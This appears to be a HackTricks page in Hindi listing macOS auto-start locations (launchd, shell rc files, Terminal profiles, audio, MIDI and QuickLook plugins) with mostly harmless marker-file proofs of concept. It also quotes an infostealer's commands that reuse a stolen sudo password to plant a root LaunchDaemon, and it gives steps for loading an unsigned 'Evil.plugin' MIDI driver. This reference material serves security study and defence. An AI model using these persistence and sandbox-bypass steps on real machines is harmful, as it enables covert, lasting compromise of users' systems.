# macOS ऑटो स्टार्ट

{{#include ../banners/hacktricks-training.md}}

यह section काफी हद तक ब्लॉग series [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/) पर आधारित है। इसका उद्देश्य उन locations की पहचान करना है जहाँ file write से बाद में code execution हो सकता है, execution को trigger करने वाला event क्या है, और इसके लिए किन permissions की ज़रूरत है। किसी location का मौजूद होना इस बात का प्रमाण नहीं है कि mechanism enabled है। नीचे बताए गए local checks macOS 26.5.2 (5 October 2026) पर किए गए थे; इनसे हर macOS release के व्यवहार की पुष्टि नहीं होती।

> [!NOTE]
> “Write-triggered” का हमेशा यह अर्थ नहीं होता कि “लिखने के तुरंत बाद चलता है।” कुछ locations को केवल login के समय, किसी खास application के शुरू होने पर, या user के कोई action करने पर पढ़ा जाता है। पहले से configured job के अंदर writable payload होना, नया job register करने की permission होने से भी अलग है। किसी technique पर निर्भर करने से पहले disposable account या VM में test करें।

## Sandbox Bypass

> [!TIP]
> यहाँ आपको **sandbox bypass** के लिए उपयोगी start locations मिलेंगी। इनके ज़रिए आप **किसी file में कुछ लिखकर** और फिर कोई बहुत **आम action**, तय **समयावधि**, या ऐसा **action** करने के लिए **इंतज़ार** करके उसे execute कर सकते हैं, जिसे आम तौर पर sandbox के अंदर से root permissions के बिना किया जा सकता है।

### Launchd

- Sandbox bypass के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
  - **Trigger**: User login (या explicit registration)
  - Root required
- **`/Library/LaunchDaemons`**
  - **Trigger**: System boot (या explicit registration)
  - Root required
- **`/System/Library/LaunchAgents`**
  - **Trigger**: User login; Apple की protected system location
- **`/System/Library/LaunchDaemons`**
  - **Trigger**: System boot; Apple की protected system location
- **`~/Library/LaunchAgents`**
  - **Trigger**: दोबारा login करने पर

`launchd` द्वारा scan की जाने वाली `~/Library/LaunchDaemons` location मौजूद नहीं है। Per-user jobs `~/Library/LaunchAgents` में होते हैं; system daemon directory `/Library/LaunchDaemons` है। [Apple की launchd startup guide](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html) scan की जाने वाली locations का वर्णन करती है।

> [!TIP]
> एक दिलचस्प बात यह है कि **`launchd`** में Mach-o section `__Text.__config` में एक embedded property list होता है, जिसमें launchd द्वारा start की जाने वाली अन्य जानी-मानी services होती हैं। इसके अलावा, इन services में `RequireSuccess`, `RequireRun` और `RebootOnSuccess` हो सकते हैं, जिनका अर्थ है कि उन्हें चलना और सफलतापूर्वक पूरा होना ज़रूरी है।
>
> बेशक, code signing के कारण इसे modify नहीं किया जा सकता।

#### विवरण और Exploitation

**`launchd`** startup पर OX S kernel द्वारा execute किया जाने वाला **पहला** **process** है और shutdown के समय सबसे आखिर में समाप्त होता है। इसका **PID 1** ही होना चाहिए। यह process इन जगहों पर मौजूद **ASEP** **plists** में दिए गए configurations को **पढ़ेगा और execute करेगा**:

- `/Library/LaunchAgents`: Admin द्वारा install किए गए per-user agents
- `/Library/LaunchDaemons`: Admin द्वारा install किए गए system-wide daemons
- `/System/Library/LaunchAgents`: Apple द्वारा दिए गए per-user agents।
- `/System/Library/LaunchDaemons`: Apple द्वारा दिए गए system-wide daemons।

जब कोई user login करता है, तो `launchd` उस user के `~/Library/LaunchAgents` में मौजूद plists को उसी user की permissions के साथ load करता है। Jobs उनकी keys के अनुसार start होते हैं; केवल plist load होने का अर्थ यह नहीं है कि process तुरंत execute होगा।

**Agents और daemons के बीच मुख्य अंतर यह है कि agents user के login करने पर load होते हैं और daemons system startup पर load होते हैं** (क्योंकि ssh जैसी services को किसी भी user के system access करने से पहले execute करना पड़ता है)। Agents GUI का उपयोग कर सकते हैं, जबकि daemons को background में चलना होता है।

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>touch /tmp/launched</string>
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

`ProgramArguments` का प्रत्येक element एक अलग argument है; `launchd` किसी एक string को shell command के रूप में parse नहीं करता। ऊपर दिए गए सुधारे गए उदाहरण की syntax जाँच, उसे load किए बिना, `plutil -lint /path/to/example.plist` से की जा सकती है। `ProgramArguments`, `RunAtLoad`, और `KeepAlive` के लिए स्थानीय `man launchd.plist` entry देखें।

#### मौजूदा jobs में file-event triggers

एक **पहले से loaded** agent या daemon, किसी नामित path में बदलाव होने पर शुरू होने के लिए `WatchPaths` का उपयोग कर सकता है। `QueueDirectories` किसी directory के खाली न होने पर job शुरू करता है; `StartOnMount` volume mount होने पर शुरू करता है। [Apple की launchd guide](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9) में `WatchPaths` और `QueueDirectories` के उदाहरण शामिल हैं। किसी watched file में लिखने से **पहले से configured job** trigger होता है; इससे arbitrary code execution केवल तभी मिलता है, जब लिखने वाला job के executable, script या job द्वारा interpret किए जाने वाले data को भी नियंत्रित कर सके। किसी scanned या registered location के बाहर नई plist लिखने मात्र से वह load नहीं होती।

यह self-cleaning PoC एक विशिष्ट नाम वाला **अस्थायी user agent** register करता है, केवल अपनी watched file में बदलाव करता है और agent को हटा देता है। इसे macOS 26.5.2 पर बिना logout या restart के सफलतापूर्वक चलाया गया था:

```python
import os, pathlib, plistlib, subprocess, tempfile, time, uuid

label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
target = f"gui/{os.getuid()}"
with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
    base = pathlib.Path(root)
    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
    watched.write_text("before\n")
    plist.write_bytes(plistlib.dumps({
        "Label": label,
        "ProgramArguments": ["/usr/bin/touch", str(marker)],
        "WatchPaths": [str(watched)],
        "RunAtLoad": False,
    }))
    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
    try:
        marker.unlink(missing_ok=True)
        watched.write_text("after\n")
        for _ in range(30):
            if marker.exists():
                break
            time.sleep(0.1)
        print("watch fired:", marker.exists())
    finally:
        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
```

लोकल रन ने `watch fired: True` प्रिंट किया, और `bootout` सफल रहा। यहाँ `launchctl bootstrap` का इस्तेमाल केवल अलग-थलग PoC के अंदर किया गया है; पहले से लोड किए गए job के लिए इसकी **ज़रूरत नहीं** है। किसी मौजूदा job का सुरक्षित आकलन करने के लिए, उसकी plist और resolved `ProgramArguments` path पढ़ें, फिर बिना कोई बदलाव किए जाँचें कि संबंधित executable या interpreted file writable है या नहीं।

कुछ मामलों में **किसी agent को user के login करने से पहले execute करना ज़रूरी होता है**; इन्हें **PreLoginAgents** कहा जाता है। उदाहरण के लिए, login के समय assistive technology उपलब्ध कराने के लिए यह उपयोगी है। ये `/Library/LaunchAgents` में भी मिल सकते हैं ([**यहाँ**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) एक उदाहरण देखें)।

> [!TIP]
> नई Daemons या Agents config files **अगले reboot के बाद या** `launchctl load <target.plist>` का इस्तेमाल करने पर **लोड होंगी**। `launchctl -F <file>` के साथ `.plist` extension के बिना भी plist files **लोड की जा सकती हैं** (हालाँकि वे plist files reboot के बाद अपने आप लोड नहीं होंगी)।\
> `launchctl unload <target.plist>` के साथ **unload करना** भी संभव है (इससे उससे जुड़ा process terminate हो जाएगा),
>
> यह **सुनिश्चित करने** के लिए कि कोई भी चीज़ (जैसे override) किसी **Agent** या **Daemon** को **चलने से रोक** नहीं रही है, चलाएँ: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

मौजूदा user द्वारा लोड किए गए सभी agents और daemons की सूची बनाएँ:

```bash
launchctl list
```

#### उदाहरण: malicious LaunchDaemon chain (password reuse)

हालिया macOS infostealer ने **captured sudo password** का दोबारा उपयोग करके एक user agent और root LaunchDaemon बनाया:<sup>[[1]](#references)</sup>

- agent loop को `~/.agent` में लिखें और उसे executable बनाएं।
- उस agent की ओर संकेत करने वाला plist `/tmp/starter` में बनाएं।
- चोरी हुए password का `sudo -S` के साथ दोबारा उपयोग करके उसे `/Library/LaunchDaemons/com.finder.helper.plist` में कॉपी करें, `root:wheel` सेट करें और `launchctl load` से लोड करें।
- आउटपुट को detach करने के लिए `nohup ~/.agent >/dev/null 2>&1 &` के ज़रिए agent को चुपचाप शुरू करें।

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> `/Library/LaunchDaemons` में रखी daemon plist, उसे user ownership देने से सुरक्षित नहीं हो जाती। `launchd` को system jobs के लिए उचित ownership और permissions चाहिए; असुरक्षित plist को यह अस्वीकार कर सकता है। Root-owned daemon आमतौर पर root के रूप में चलता है, जब तक कि इसकी configuration में कोई दूसरा account न चुना गया हो। Job के `UserName`, `GroupName`, ownership और `launchctl` diagnostics जाँचें; केवल plist के owner के नाम से execution identity का अनुमान न लगाएँ।

#### launchd के बारे में अधिक जानकारी

**`launchd`** पहला user mode process है, जिसे **kernel** से शुरू किया जाता है। Process का शुरू होना **सफल** होना चाहिए और यह **बंद या crash नहीं हो सकता**। यह कुछ **killing signals** से भी **सुरक्षित** है।

`launchd` सबसे पहले जिन कामों में से एक करता है, वह है सभी **daemons** को **शुरू करना**, जैसे:

- **समय के आधार पर चलने वाले Timer daemons**:
  - macOS 26.5.2 में `com.apple.atrun.plist`, `/usr/libexec/atrun` को `StartInterval = 30` seconds के साथ चलाता है; इसकी प्रभावी enabled state, plist की `Disabled` key से अलग हो सकती है, क्योंकि `launchd` overrides को अलग से रखता है।
  - `/usr/lib/cron/tabs` में jobs होने पर `com.vix.cron.plist`, `/usr/sbin/cron` को चलाता है। `com.apple.systemstats.daily` एक अलग scheduled service है, cron daemon नहीं।
- **Network daemons**, जैसे:
  - `org.cups.cups-lpd`: TCP (`SockType: stream`) पर `SockServiceName: printer` के साथ सुनता है
    - SockServiceName या तो port होना चाहिए या `/etc/services` की कोई service
  - `com.apple.xscertd.plist`: TCP port 1640 पर सुनता है
- **Path daemons**, जिन्हें निर्दिष्ट path में बदलाव होने पर चलाया जाता है:
  - `com.apple.postfix.master`: `/etc/postfix/aliases` path की जाँच करता है
- **IOKit notifications daemons**:
  - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
  - `com.apple.xscertd-helper.plist`: इसकी `MachServices` entry में `com.apple.xscertd.helper` नाम दिया गया है
- **UserEventAgent:**
  - यह पिछले वाले से अलग है। यह किसी खास event के जवाब में `launchd` से apps शुरू करवाता है। हालाँकि, इस मामले में मुख्य binary `launchd` नहीं, बल्कि `/usr/libexec/UserEventAgent` है। यह SIP restricted folder /System/Library/UserEventPlugins/ से plugins load करता है, जहाँ हर plugin अपना initialiser `XPCEventModuleInitializer` key में बताता है या पुराने plugins के मामले में, अपने `Info.plist` की `CFPluginFactories` dict में `FB86416D-6164-2070-726F-70735C216EC0` key के अंतर्गत बताता है।

### shell startup files

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- sandbox bypass के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन आपको ऐसा app ढूँढ़ना होगा जिसमें TCC bypass हो और जो इन files को load करने वाला shell execute करे

#### Locations

- **`~/.zshenv`** (या इसका नया compiled संस्करण **`~/.zshenv.zwc`**)
  - **Trigger**: कोई भी सामान्य zsh invocation, जिसमें noninteractive `zsh -c` भी शामिल है; `zsh -f` user startup files को छोड़ देता है।
- **`~/.zshrc`**
  - **Trigger**: Interactive zsh शुरू होता है।
- **`~/.zprofile`, `~/.zlogin`**
  - **Trigger**: Login zsh शुरू होता है; इन्हें क्रमशः `.zshrc` से पहले और बाद में पढ़ा जाता है।
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  - **Trigger**: zsh के साथ terminal खोलें
  - Root आवश्यक है
- **`~/.zlogout`**
  - **Trigger**: Login zsh सामान्य रूप से बंद होता है; हर terminal या shell के बंद होने पर नहीं।
- **`/etc/zlogout`**
  - **Trigger**: zsh के साथ terminal बंद करें
  - Root आवश्यक है
- संभावित रूप से और जानकारी यहाँ: **`man zsh`**
- **`~/.bashrc`**
  - **Trigger**: Interactive **non-login** Bash शुरू करें। Interactive login Bash इसे तभी पढ़ता है, जब कोई login file इसे स्पष्ट रूप से source करे।
- **`~/.bash_profile`, `~/.bash_login`, `~/.profile`**
  - **Trigger**: Login Bash शुरू करें; इस क्रम में पहली readable file चलती है। पहले की दोनों files में से कोई मौजूद हो, तो `~/.profile` छोड़ दिया जाता है।
- **`/etc/profile`**
  - **Trigger**: Login Bash शुरू करें; इसे बदलने के लिए root आवश्यक है।
- **`~/.tcshrc`** या, इसके न होने पर, **`~/.cshrc`**
  - **Trigger**: `tcsh` शुरू करें; इस Mac पर noninteractive `tcsh -c` भी शामिल है। User को वास्तव में `tcsh` चलाना होगा; यह macOS का default shell नहीं है।
- **`~/.login`**
  - **Trigger**: Login `tcsh` शुरू करें; इसकी rc file के बाद।
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  - **Trigger**: xterm के साथ चलने की अपेक्षा है, लेकिन यह **installed नहीं है** और install करने के बाद भी यह error आता है: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### विवरण और Exploitation

`zsh` या `bash` जैसा shell environment शुरू करते समय, **कुछ startup files चलाई जाती हैं**। macOS में अभी `/bin/zsh` default shell है। Terminal या SSH login shell शुरू करता है या interactive shell, यह उनकी configuration पर निर्भर करता है; यह न मानें कि हर session में ऊपर दी गई हर file चलती है। macOS में `bash` और `sh` भी मौजूद हैं, लेकिन उन्हें इस्तेमाल करने के लिए स्पष्ट रूप से invoke करना पड़ता है।<sup>[[2]](#references)</sup> [zsh startup-file reference](https://zsh.sourceforge.io/Doc/Release/Files.html) में क्रम, `ZDOTDIR` override और `.zwc` नियम की जानकारी दी गई है।

macOS 26.5.2 पर किए गए इस read-only प्रयोग में disposable `ZDOTDIR` का उपयोग किया गया। इससे पता चलता है कि कौन-सी user files पढ़ी गईं; किसी असली shell startup file में बदलाव नहीं किया गया:

```bash
lab=$(mktemp -d)
for name in zshenv zprofile zshrc zlogin zlogout; do
  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
done
for flags in -c -ic -lc -lic; do
  : > "$lab/seen"
  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
done
rm -r "$lab"
```

देखा गया क्रम `-c`: `zshenv`; `-ic`: `zshenv zshrc`; `-lc`: `zshenv zprofile zlogin`; `-lic`: `zshenv zprofile zshrc zlogin zlogout` था। `ZDOTDIR` को पहले से alternate directory पर पॉइंट करना ज़रूरी है; किसी मनमानी directory में केवल files लिखना पर्याप्त नहीं है।

[Bash की startup reference](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html) login और interactive shells में अंतर बताती है। macOS 26.5.2 test machine पर, चारों user startup files वाले अलग-थलग `HOME` से ये परिणाम मिले: `bash -c` → कोई नहीं, `bash -ic` → `.bashrc`, `bash -lc` और `bash -lic` → केवल `.bash_profile`। `.bash_profile` हटाने पर login Bash ने `.bash_login` पढ़ी, और उसके भी हटाए जाने पर `.profile` पढ़ी। `BASH_ENV` noninteractive Bash को किसी file की ओर पॉइंट कर सकता है, लेकिन invoking process में यह environment variable पहले से set होना चाहिए। Login Bash से स्पष्ट रूप से `exit` करने पर `~/.bash_logout` भी load हो सकती है।

Local `tcsh(1)` manual अपना अलग startup क्रम बताता है। अस्थायी `HOME` के साथ, `/bin/tcsh -c :` ने `.tcshrc` पढ़ी, या `.tcshrc` मौजूद न होने पर `.cshrc` पढ़ी। अस्थायी login `tcsh` ने `.tcshrc` और `.login` पढ़ी। इन जाँचों में केवल अस्थायी files बनाई और हटाई गईं।

### फिर से खोले गए Applications

> [!CAUTION]
> बताई गई exploitation को configure करके logout और फिर login करने, या यहाँ तक कि reboot करने पर भी, testing में app execute नहीं हुई। ये कार्रवाइयाँ करते समय app का चल रहा होना आवश्यक हो सकता है।

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Sandbox bypass के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  - **Trigger**: Restart पर applications को फिर से खोलना

#### विवरण और Exploitation

फिर से खोली जाने वाली सभी applications plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup> के अंदर होती हैं।

इसलिए, फिर से खुलने वाली applications से अपनी app launch करवाने के लिए, आपको बस **अपनी app को सूची में जोड़ना** होगा।

UUID उस directory को list करके या `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` से पाया जा सकता है।

फिर से खोली जाने वाली applications की जाँच करने के लिए, आप यह चला सकते हैं:

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

इस सूची में **एक application जोड़ने** के लिए आप इस्तेमाल कर सकते हैं:

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Terminal Preferences

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Terminal का उपयोग करने वाले user के पास FDA permissions होती हैं

#### Location

- **`~/Library/Preferences/com.apple.Terminal.plist`**
  - **Trigger**: उस profile का उपयोग करके एक नई Terminal window या tab खोलें जिसकी Shell settings में startup command मौजूद हो

#### Description & Exploitation

**`~/Library/Preferences`** में Applications में user की preferences store होती हैं। इनमें से कुछ preferences में **अन्य applications/scripts execute करने** के लिए configuration हो सकती है।<sup>[[5]](#references)</sup>

उदाहरण के लिए, Terminal Startup में कोई command execute कर सकता है:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

यह config **`~/Library/Preferences/com.apple.Terminal.plist`** फ़ाइल में इस तरह दिखाई देता है:

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

यदि संबंधित profile में startup command मौजूद है और Terminal उस preference को पढ़ता है, तो उस profile का उपयोग करने वाला नया session उसे execute कर सकता है। [Apple की मौजूदा Terminal गाइड](https://support.apple.com/guide/terminal/trmlshll/mac) प्रति-profile **Shell → Startup** command का दस्तावेज़ देती है। उस profile का उपयोग करने वाला नया session शुरू किए बिना केवल Terminal खोलना पर्याप्त नहीं है। नीचे दिए गए preference edits को research Mac पर **नहीं** चलाया गया था।

आप इसे cli से जोड़ सकते हैं:

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```

### Terminal Scripts / Other file extensions

- Sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - उपयोगकर्ता की FDA permissions पाने के लिए Terminal का उपयोग करें

#### स्थान

- **कहीं भी**
  - **ट्रिगर**: संबंधित `.terminal`, `.command`, या `.tool` फ़ाइल खोलें

#### विवरण और Exploitation

यदि कोई उपयोगकर्ता **`.terminal`** settings फ़ाइल खोलता है, तो Terminal उसकी profile से एक session बना सकता है; executable **`.command`** और **`.tool`** फ़ाइलें भी Terminal में खुल सकती हैं। यह फ़ाइल खोलने से होने वाला स्पष्ट trigger है, केवल Terminal खोलने से execution नहीं होता। विरासत में मिली कोई भी TCC access, Terminal को वास्तव में मिली permissions और की जा रही operation पर निर्भर करती है। नीचे दिया गया ऐतिहासिक उदाहरण research Mac पर नहीं चलाया गया था।

इसे आज़माएँ:

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# After inspecting the marker, remove the disposable file and marker:
rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
```

आप regular shell script content के साथ **`.command`**, **`.tool`** extensions का भी उपयोग कर सकते हैं और इन्हें भी Terminal खोलेगा।

> [!CAUTION]
> अगर Terminal के पास **Full Disk Access** है, तो वह वह कार्रवाई पूरी कर सकेगा (ध्यान दें कि execute किया गया command Terminal window में दिखाई देगा)।

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - आपको कुछ अतिरिक्त TCC access मिल सकता है

#### Location

- **`/Library/Audio/Plug-Ins/HAL`**
  - Root आवश्यक है
  - **Trigger**: Core Audio server एक compatible HAL device plug-in लोड करता है; server को restart करने से दोबारा खोज हो सकती है
- **`/Library/Audio/Plug-ins/Components`**
  - Root आवश्यक है
  - **Trigger**: कोई audio host installed Audio Unit को खोजता और instantiate करता है
- **`~/Library/Audio/Plug-ins/Components`**
  - **Trigger**: कोई audio host installed Audio Unit को खोजता और instantiate करता है
- **`/System/Library/Components`**
  - Apple द्वारा दिया गया, system-protected location
  - **Trigger**: कोई audio host इससे मेल खाने वाले system component को instantiate करता है

#### Description

पिछले writeups के अनुसार, कुछ audio plugins **compile** करके उन्हें load करवाना संभव है।<sup>[[6]](#references)[[7]](#references)</sup>

HAL device plug-ins और Audio Units अलग-अलग load paths का उपयोग करते हैं। [Apple की Audio Unit hosting guide](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html) के अनुसार, host को कोई component ढूँढ़कर instantiate करना होता है; उसे scan directory में copy करने या `coreaudiod` को restart करने से अपने-आप यह साबित नहीं होता कि वह execute हुआ। AUv2 plug-ins host process में चलते हैं, जबकि [Apple की मौजूदा Audio Unit guidance](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments) के अनुसार, macOS पर AUv3 डिफ़ॉल्ट रूप से अलग process में चलता है। Signature, sandbox और library-validation संबंधी पाबंदियाँ host पर निर्भर करती हैं। Research Mac पर कोई audio plug-in install या execute नहीं किया गया।

### CoreMIDI Drivers (MIDIServer)

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- Sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - आपका code `MIDIServer` process के अंदर चलता है, आपके app के sandbox में नहीं
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - `MIDIServer` अपने `seatbelt` sandbox profile के तहत चलता है

#### Location

- **`~/Library/Audio/MIDI Drivers/*.plugin`**
  - Root आवश्यक नहीं है (user-writable)
  - **Trigger**: `MIDIServer` शुरू या दोबारा शुरू होता है। इसे पहली बार CoreMIDI का उपयोग करने वाला कोई भी process मांग पर launch करता है (जैसे *Audio MIDI Setup*, GarageBand, कोई DAW, या WebMIDI का उपयोग करने वाला कोई page खोलने पर)
- **`/Library/Audio/MIDI Drivers/*.plugin`**
  - Root आवश्यक है
  - **Trigger**: ऊपर जैसा ही

#### Description & Exploitation

Apple का `MIDIServer` (`/System/Library/Frameworks/CoreMIDI.framework/MIDIServer`), `Audio/MIDI Drivers` directories से MIDI **driver** bundles लोड करता है। यह binary Apple-signed है, लेकिन इसके साथ `com.apple.security.cs.disable-library-validation` entitlement शामिल है, इसलिए यह किसी **unsigned या किसी दूसरी team द्वारा ad-hoc signed** bundle को लोड कर सकता है। इससे बिना **root** के, Apple के स्वामित्व वाले एक अलग process के अंदर code execution मिलता है।<sup>[[53]](#references)</sup>

macOS 26 पर सत्यापित (read-only):

```bash
# user-writable, no root needed
ls -ld ~/Library/"Audio/MIDI Drivers"            # exists, owned by the user
codesign -d --entitlements :- /System/Library/Frameworks/CoreMIDI.framework/MIDIServer 2>/dev/null \
  | grep disable-library-validation              # -> com.apple.security.cs.disable-library-validation
```

एक driver एक मानक bundle है जो `MIDIDriverInterface` factory export करता है; payload को factory/constructor में रखने से यह `MIDIServer` द्वारा drivers की enumeration करते ही चल जाता है। इसे build करके `~/Library/Audio/MIDI Drivers/Evil.plugin` के रूप में रखें, फिर बिना logout/reboot किए इसे load करवाएँ:

```bash
# starts MIDIServer, which scans the driver directories
open -a "Audio MIDI Setup"
```

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- sandbox को bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - आपको कुछ अतिरिक्त TCC access मिल सकता है

#### Location

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### विवरण और Exploitation

QuickLook plugins तब execute हो सकते हैं, जब आप **किसी file का preview खोलते हैं** (Finder में file चुनकर space bar दबाएँ) और उस **file type को support करने वाला plugin** installed हो।<sup>[[8]](#references)</sup>

अपना QuickLook plugin compile करना, उसे load करने के लिए ऊपर दिए गए किसी एक स्थान पर रखना, फिर किसी supported file पर जाकर उसे trigger करने के लिए space दबाना संभव है।

ये paths legacy `.qlgenerator` bundles को refer करते हैं; [Apple की Quick Look architecture guide](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html) search order और matching file types का दस्तावेज़ देती है। मौजूदा Quick Look **app extensions** किसी app के साथ package किए जाते हैं और उनके registration तथा execution के नियम अलग होते हैं। किसी generator का मौजूद होना यह साबित नहीं करता कि type selection में वही चुना जाएगा या उसका code Finder के भीतर ही run होगा। Legacy generator path की जाँच documentation और directory की मौजूदगी के आधार पर की गई थी; research Mac पर कोई generator install या load नहीं किया गया था।

### ~~Login/Logout Hooks~~

> [!CAUTION]
> यह मेरे लिए काम नहीं किया—न user LoginHook के साथ, न root LogoutHook के साथ।

